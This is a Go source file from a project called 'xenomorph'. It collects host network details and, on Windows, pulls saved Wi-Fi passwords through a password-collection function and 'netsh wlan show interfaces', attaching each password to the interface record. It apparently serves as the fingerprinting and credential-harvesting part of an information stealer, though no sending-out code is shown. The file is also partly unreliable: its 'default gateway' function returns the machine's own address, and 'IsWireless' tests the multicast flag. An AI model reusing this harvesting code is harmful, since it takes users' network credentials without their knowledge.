package network

import (
	"fmt"
	"net"
	"os/exec"
	"regexp"
	"strings"

	"github.com/codevault-llc/xenomorph/pkg/logger"
	"github.com/codevault-llc/xenomorph/pkg/types"
	"github.com/codevault-llc/xenomorph/pkg/utils"
	"go.uber.org/zap"
)

func getNetworkInterfaces() ([]net.Interface, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		return nil, fmt.Errorf("failed to get network interfaces: %w", err)
	}
	return interfaces, nil
}

// Retrieves the MAC address of the first network interface found.
func GetMacAddress() (string, error) {
	interfaces, err := getNetworkInterfaces()
	if err != nil {
		return "", fmt.Errorf("failed to get network interfaces: %w", err)
	}

	for _, iface := range interfaces {
		if len(iface.HardwareAddr) > 0 {
			return iface.HardwareAddr.String(), nil
		}
	}

	return "", fmt.Errorf("no MAC address found")
}

// GetDefaultGateway retrieves the default gateway of the first non-loopback network interface.
func GetDefaultGateway() (string, error) {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "", fmt.Errorf("failed to get default gateway: %w", err)
	}

	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				gateway := ipnet.IP.String()
				logger.L().Debug("Default gateway found", zap.String("gateway", gateway))
				return gateway, nil
			}
		}
	}

	return "", fmt.Errorf("no default gateway found")
}

// GetDNSInfo retrieves the DNS information by looking up the IP addresses for a known domain.
func GetDNSInfo() ([]string, error) {
	addrs, err := net.LookupIP("google.com")
	if err != nil {
		return nil, fmt.Errorf("failed to lookup DNS: %w", err)
	}

	var ips []string
	for _, addr := range addrs {
		if ipv4 := addr.To4(); ipv4 != nil {
			ips = append(ips, ipv4.String())
		}
	}

	if len(ips) == 0 {
		return nil, fmt.Errorf("no DNS information found")
	}

	return ips, nil
}

// GetSubnetMask retrieves the subnet mask of the first non-loopback network interface.
// It returns the mask in CIDR notation.
func GetSubnetMask() (string, error) {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "", fmt.Errorf("failed to get subnet mask: %w", err)
	}

	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			mask := ipnet.Mask
			return mask.String(), nil
		}
	}

	return "", fmt.Errorf("no valid subnet mask found")
}

// Get network interfaces including their names, MAC addresses, and IP addresses and Password
func GetNetworkInterfaces() ([]types.NetworkInterface, error) {
	interfaces, err := getNetworkInterfaces()
	if err != nil {
		logger.L().Error("Failed to get network interfaces", zap.Error(err))
		return nil, fmt.Errorf("failed to get network interfaces: %w", err)
	}

	passwords := make(map[string]string)
	if utils.IsWindows() {
		passwords, _ = GetAllWiFiPasswords() // optional error logging
	}

	var netInterfaces []types.NetworkInterface
	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}

		ipAddrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		var ips []string
		for _, addr := range ipAddrs {
			if ipnet, ok := addr.(*net.IPNet); ok {
				ips = append(ips, ipnet.IP.String())
			}
		}

		var ssid, password string
		if iface.Name == "Wi-Fi" || strings.Contains(strings.ToLower(iface.Name), "wi-fi") {
			ssid, err = getCurrentSSIDWindows()
			if err == nil {
				password = passwords[ssid]
			}
		}

		netInterfaces = append(netInterfaces, types.NetworkInterface{
			SSID:          ssid,
			MACAddress:    iface.HardwareAddr.String(),
			IPAddresses:   ips,
			IsUp:          iface.Flags&net.FlagUp != 0,
			IsLoopback:    iface.Flags&net.FlagLoopback != 0,
			IsPointToPoint: iface.Flags&net.FlagPointToPoint != 0,
			IsWireless:    iface.Flags&net.FlagMulticast != 0,
			Password:      password,
		})
	}

	return netInterfaces, nil
}

// getCurrentSSIDWindows retrieves the current SSID on Windows systems.
// It uses the `netsh` command to get the SSID of the connected Wi-Fi network.
// Returns an error if the command fails or if the SSID cannot be found.
func getCurrentSSIDWindows() (string, error) {
	cmd := exec.Command("netsh", "wlan", "show", "interfaces")
	output, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("failed to get current SSID: %w", err)
	}

	re := regexp.MustCompile(`^\s*SSID\s*:\s*(.+)$`)
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if match := re.FindStringSubmatch(line); len(match) == 2 {
			return strings.TrimSpace(match[1]), nil
		}
	}
	return "", fmt.Errorf("SSID not found")
}
